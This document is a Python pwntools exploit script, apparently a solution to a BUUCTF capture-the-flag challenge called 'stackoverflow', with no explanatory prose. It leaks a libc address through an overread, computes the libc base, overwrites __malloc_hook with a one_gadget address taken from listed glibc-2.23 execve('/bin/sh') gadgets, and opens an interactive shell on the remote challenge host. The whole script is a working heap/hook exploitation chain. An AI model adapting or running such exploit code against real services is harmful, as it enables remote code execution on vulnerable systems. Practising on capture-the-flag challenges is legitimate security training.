from pwn import *

#context.log_level = 'debug'
#io = process("./stackoverflow")
io = remote('node4.buuoj.cn', 29389)
elf = ELF("./stackoverflow")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

payload = b'A'*78 + b'XX'
io.sendafter(b'bro:', payload)
io.recvuntil(b'XX')
stdout = u64(io.recvuntil(b',', drop = True).ljust(8, b'\x00'))
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
print("libc_base:", hex(libc_base))
#debug()

io.sendlineafter(b'stackoverflow: ', str(7100680).encode())
#print(io.recv())
sleep(0.01)
io.sendlineafter(b'stackoverflow: ', str(3145728).encode())
#print(io.recv())
#debug()
io.sendlineafter(b'ropchain: ', b'A')
#print(io.recv())
#debug()
malloc_hook = libc_base + libc.symbols['__malloc_hook']
payload = p64(malloc_hook)*4 + p64(malloc_hook+8)
io.sendafter(b'stackoverflow: ', payload)
io.sendlineafter(b'ropchain: ', b'A')
for i in range(39):
	io.sendlineafter(b'ropchain: ', b'B')
#debug()

"""
local glibc-2.23
0x45226 execve("/bin/sh", rsp+0x30, environ)
0x4527a execve("/bin/sh", rsp+0x30, environ)
0xf03a4 execve("/bin/sh", rsp+0x50, environ)
0xf1247 execve("/bin/sh", rsp+0x70, environ)
"""

"""
buuctf glibc-2.23
0x45216 execve("/bin/sh", rsp+0x30, environ)
0x4526a execve("/bin/sh", rsp+0x30, environ)
0xf02a4 execve("/bin/sh", rsp+0x50, environ)
0xf1147 execve("/bin/sh", rsp+0x70, environ)
"""
one_gadget = libc_base + 0xf1147
print("one_gadget:", hex(one_gadget))
payload  = p64(one_gadget) # __malloc_hook
io.sendafter(b'stackoverflow: ', payload)
#debug()

io.interactive()
